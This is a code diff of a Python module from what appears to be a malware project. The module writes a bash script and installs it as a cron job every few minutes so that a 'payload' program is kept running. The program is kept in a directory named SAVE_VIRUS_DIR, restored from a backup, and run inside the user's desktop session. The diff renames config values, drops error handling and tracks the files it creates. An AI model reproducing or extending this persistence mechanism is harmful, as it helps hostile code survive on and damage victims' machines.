@@ -1,24 +1,15 @@
 import subprocess
 import os
-import tempfile
 import hashlib
-from config import DIR_SAVE_VIRUS, BACKUP_DIR_DEFAULT, PREFIX_DIR_PAYLOAD, CRON_DIR, BASH_SCRIPT_NAME
+from config import SAVE_VIRUS_DIR, BACKUP_DIR, CRON_DIR, BASH_SCRIPT_NAME, LIST_NEW_FILES
 
 def create_bash_content(progFileName: str, progFileBackup: str) -> str:
     """
     Creates a bash script to be used in cron job
     """
 
-    dirSaveVirus = os.path.expanduser(DIR_SAVE_VIRUS)
-    backupDir = os.path.expanduser(BACKUP_DIR_DEFAULT)
-
-    try:
-        os.makedirs(dirSaveVirus, exist_ok=True)
-        os.makedirs(backupDir, exist_ok=True)
-        dirSavePayload = tempfile.mkdtemp(prefix=PREFIX_DIR_PAYLOAD, dir=dirSaveVirus)
-    except Exception as e:
-        print(f"Error creating backup or virus directory: {e}")
-        return None
+    dirSaveVirus = os.path.expanduser(SAVE_VIRUS_DIR)
+    backupDir = os.path.expanduser(BACKUP_DIR)
 
     bash_content = f"""
     #!/usr/bin/env bash
@@ -28,7 +19,7 @@ def create_bash_content(progFileName: str, progFileBackup: str) -> str:
     export XDG_RUNTIME_DIR=/run/user/1000
     export DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
     
-    PROG="{dirSavePayload}/{progFileName}"
+    PROG="{dirSaveVirus}/{progFileName}"
     BACKUP="{backupDir}/{progFileBackup}"
     
     LOCKFILE="/tmp/payload-cron-runner.lock"
@@ -63,11 +54,6 @@ def install_cron_job(bash_content: str, interval_minutes: int = 5) -> bool:
     Install a cron job to run the bash script every interval_minutes
     """
     cron_dir = os.path.expanduser(CRON_DIR)
-    try:
-        os.makedirs(cron_dir, exist_ok=True)
-    except Exception as e:
-        print(f"Error creating cron directory {cron_dir}: {e}")
-        return False
 
     bash_path = os.path.join(cron_dir, BASH_SCRIPT_NAME)
 
@@ -84,6 +70,7 @@ def install_cron_job(bash_content: str, interval_minutes: int = 5) -> bool:
         with open(bash_path, "w") as f:
             f.write(bash_content)
         os.chmod(bash_path, 0o755)
+        LIST_NEW_FILES.append(bash_path)
     except Exception as e:
         print(f"Error writing bash script {bash_path}: {e}")
         return False
